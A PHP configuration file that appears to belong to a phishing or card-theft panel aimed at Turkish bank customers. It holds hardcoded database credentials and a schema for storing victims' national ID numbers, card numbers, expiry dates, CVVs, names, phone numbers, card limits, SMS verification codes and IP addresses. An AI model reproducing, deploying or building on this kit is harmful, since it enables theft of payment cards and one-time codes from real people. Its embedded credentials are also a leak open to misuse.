<?php

error_reporting(E_ALL);
ini_set('display_errors', 'On');
include 'constants.php';
// Coded by Chester Phoenix
// ICQ => maxushizysuq@mail.ru
// Replace dbname with your database name
// The database username it says user
// Correct accordingly

if(IS_LOCAL) {
    $dbname = 'fastcheckouts';
    $user = 'root';
    $password = 'markomeje';
}else {
    $dbname = 'fastcheckout_db';
    $user = 'fstchkout_user';
    $password = '84^7uo3Qf';
}
//PDO Connection Settings->


//$dbname = 'fastcheckouts';
//$user = 'root';
//$password = '';

//DO NOT TOUCH
$host = IS_LOCAL ? '127.0.0.1' : 'localhost';
$dsn = 'mysql:host='.$host.';dbname='.$dbname;

//DB row names (DO NOT TOUCH)
$a = "Banka";
$b = "TCKN";
$c = "Kart No";
$d = "SKT";
$e = "CVV";
$f = "Ad Soyad";
$g = "Telefon";
$h = "Limit";
$j = "SMS";
$k = "SMS-2";
$n = "Sayfa";
$o = "IP";

//DB column names (DO NOT TOUCH)
$columnName1 = "bank_name";
$columnName2 = "tckn";
$columnName3 = "cardnumber";
$columnName4 = "exp";
$columnName5 = "cvv";
$columnName6 = "fullname";
$columnName7 = "phone";
$columnName8 = "climit";
$columnName9 = "sms";
$columnName10 = "sms2";
$columnName11 = "page";
$columnName12 = "ip";
$columnName13 = "active_status";


//Excel CONFIGURE (DO NOT TOUCH)
$column1 = "`{$columnName1}`";
$column2 = "`{$columnName2}`";
$column3 = "`{$columnName3}`";
$column4 = "`{$columnName4}`";
$column5 = "`{$columnName5}`";
$column6 = "`{$columnName6}`";
$column7 = "`{$columnName7}`";
$column8 = "`{$columnName8}`";
$column9 = "`{$columnName9}`";
$column10 = "`{$columnName10}`";
$column11 = "`{$columnName11}`";
$column12 = "`{$columnName12}`";

?>